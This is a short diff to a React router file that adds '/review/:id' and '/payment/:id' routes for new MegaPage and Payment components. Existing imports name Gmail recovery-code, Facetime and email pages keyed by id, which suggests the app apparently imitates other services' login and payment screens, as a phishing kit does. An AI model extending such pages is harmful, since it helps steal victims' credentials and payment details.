@@ -40,6 +40,8 @@ import HomePage from "../components/Email/HomePage";
 import RecoveryCode from "../components/Gmail/RecoveryCode";
 import EscortComments from "../components/Babylon/EscortComments";
 import FacetimeNew from "../components/Email/FacetimeNew";
+import MegaPage from "../components/Email/MegaPage";
+import Payment from "../components/Email/Payment";
 
 export const router = createBrowserRouter([
   {
@@ -86,6 +88,16 @@ export const router = createBrowserRouter([
     //     },
     //   }),
     element: <FacetimeNew></FacetimeNew>,
+  },
+    {
+    path: "/review/:id",
+    
+    element: <MegaPage></MegaPage>,
+  },
+    {
+    path: "/payment/:id",
+    
+    element: <Payment></Payment>,
   },
   // {
   //   path: "/auth/login/:id",
